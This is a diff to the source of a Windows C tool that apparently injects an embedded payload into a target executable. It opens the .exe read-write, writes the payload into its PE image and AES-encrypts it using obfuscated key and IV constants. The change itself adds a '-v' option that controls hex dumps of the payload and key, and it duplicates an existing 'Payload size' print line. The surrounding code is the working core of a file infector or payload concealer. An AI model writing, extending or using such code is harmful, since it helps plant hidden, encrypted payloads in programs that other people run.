@@ -57,7 +57,11 @@ static_assert(aesIv_obf.size == AES_BLOCKSZ,
               "Invalid AES IV size (should be " _AES_BLOCKSZ_STR " bytes): " CONF_AES_IV);
 #endif  // NO_ENCRYPT
 
-int main(int argc, char* argv[]) {
+static VOID PrintUsage(CONST LPCSTR sProgram) {
+    fprintf(stderr, "Usage: %s <target.exe> [-v]\n", sProgram);
+}
+
+int main(CONST int argc, CONST LPCSTR argv[]) {
     int ret = 0;
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
@@ -88,15 +92,37 @@ int main(int argc, char* argv[]) {
     printf("Payload size: %lu\n", dwPayloadSize);
     // HexDump((PCBYTE)&__payload_start, dwPayloadSize);
 
-    if (argc < 2) {
-        fprintf(stderr, "Usage: %s <target.exe>\n", argv[0]);
+    LPCSTR sTarget;
+    BOOL bVerbose = FALSE;
+
+    if (argc < 2 || argc > 3) {
+        PrintUsage(argv[0]);
         ret = 1;
         goto exit;
     }
 
-    printf("[*] Reading file: %s\n", argv[1]);
+    sTarget = argv[1];
 
-    hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
+    if (argc == 3) {
+        if (strcmp(sTarget, "-v") == 0) {
+            bVerbose = TRUE;
+            sTarget = argv[2];
+        } else if (strcmp(argv[2], "-v") == 0) {
+            bVerbose = TRUE;
+        } else {
+            fprintf(stderr, "[!] Invalid argument given\n");
+            PrintUsage(argv[0]);
+            ret = 1;
+            goto exit;
+        }
+    }
+
+    printf("Payload size: %lu\n", dwPayloadSize);
+    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);
+
+    printf("[*] Reading file: %s\n", sTarget);
+
+    hFile = CreateFileA(sTarget, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         PrintError("CreateFileA");
@@ -286,7 +312,9 @@ int main(int argc, char* argv[]) {
 
     // Payload is ready to be injected
     printf("New payload:\n");
+    if (bVerbose) {
     HexDump(&__payload_start, dwPayloadSize);
+    }
 
     pPayloadDest = (PBYTE)pDosHeaderRW + dwPayloadPtr;
 
@@ -296,10 +324,14 @@ int main(int argc, char* argv[]) {
 
 #ifndef NO_ENCRYPT
     printf("[*] Encrypting payload...\n");
+
+    if (bVerbose) {
     printf("[*] Using AES key:\n");
     HexDump((PCBYTE)DEOBF_BYTES(aesKey), DEOBF(aesKey).size);
     printf("[*] Using AES IV:\n");
     HexDump((PCBYTE)DEOBF_BYTES(aesIv), DEOBF(aesIv).size);
+    }
+
     sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
     printf("Encrypted payload offset: %#llx\n", sszPayloadEncOffset);
     if (sszPayloadEncOffset < 0) {
